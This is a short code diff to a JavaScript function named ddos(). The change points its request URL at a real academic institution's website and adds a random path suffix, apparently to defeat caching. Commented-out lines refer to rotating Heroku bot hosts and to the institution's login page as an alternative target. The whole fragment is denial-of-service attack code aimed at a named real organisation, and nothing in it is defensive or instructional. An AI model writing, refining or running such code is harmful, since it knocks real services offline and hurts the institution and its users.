@@ -24,7 +24,8 @@ function ddos(){
     // const uril="http://"+botArray[count]+".herokuapp.com?index="+count+"&count=3"
     // const uril ="http://tatras4.herokuapp.com?index=0&count=3"
     // console.log(uril)
-    const uril="https://www.iiserkol.ac.in/web/en/#gsc.tab=0"
+    const extra="pics"+Math.random()
+    const uril="https://www.iiserkol.ac.in/web/en/#gsc.tab=0/"+extra
     //const uril="https://welearn.iiserkol.ac.in/login/index.php"
     // count=count+1;
     // if(count>=botArray.length) count=0;
